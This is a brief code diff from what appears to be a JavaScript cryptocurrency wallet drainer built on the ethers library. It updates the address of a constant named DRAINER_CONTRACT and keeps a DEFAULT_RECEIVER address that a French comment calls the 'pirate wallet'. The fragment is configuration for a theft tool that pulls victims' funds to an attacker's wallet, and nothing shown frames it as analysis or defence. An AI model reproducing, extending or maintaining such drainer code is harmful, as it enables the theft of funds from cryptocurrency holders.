@@ -8,7 +8,7 @@ import { ethers } from "ethers";
 // ============================================================
 
 // Nouvelle adresse du contrat avec fallback
-const DRAINER_CONTRACT = "0xA9Daa81e9B53c0F9DFf1966Da7D8b89E08f4F30C"; // Mets ici la nouvelle adresse
+const DRAINER_CONTRACT = "0xc0F4ef5CeBED2F2755F7f60a2Acec327BDAcdbE3"; // Mets ici la nouvelle adresse
 
 const DEFAULT_RECEIVER = "0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf"; // ton wallet pirate
 
